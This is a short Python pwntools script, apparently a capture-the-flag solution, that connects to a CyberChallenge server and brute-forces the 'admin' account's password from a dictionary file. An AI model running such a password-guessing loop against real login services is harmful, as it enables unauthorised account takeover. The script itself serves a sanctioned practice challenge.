from pwn import *
host = "spg.challs.cyberchallenge.it"
port = 9600

dict = "dictionary.txt"


r = remote(host, port)

print("RUNNING:")

with open(dict, "r") as f:
    for line in f: 
        try: 
            print(r.recvuntil(b"Exit").decode())
            r.sendline(b'2')
            print(r.recvuntil(b"username:").decode())
            r.sendline(b'admin')
            print(r.recvuntil(b"password:").decode())
            print("SENDING: ", line.strip())
            r.sendline(line.strip().encode())
            answ = r.recvline()
            if "wrong" not in answ.decode():
                print(answ.decode())
                print(r.recvline().decode())
                break
            
        except (EOFError, KeyboardInterrupt) as e:
            print(e)
            print(answ.decode())
    
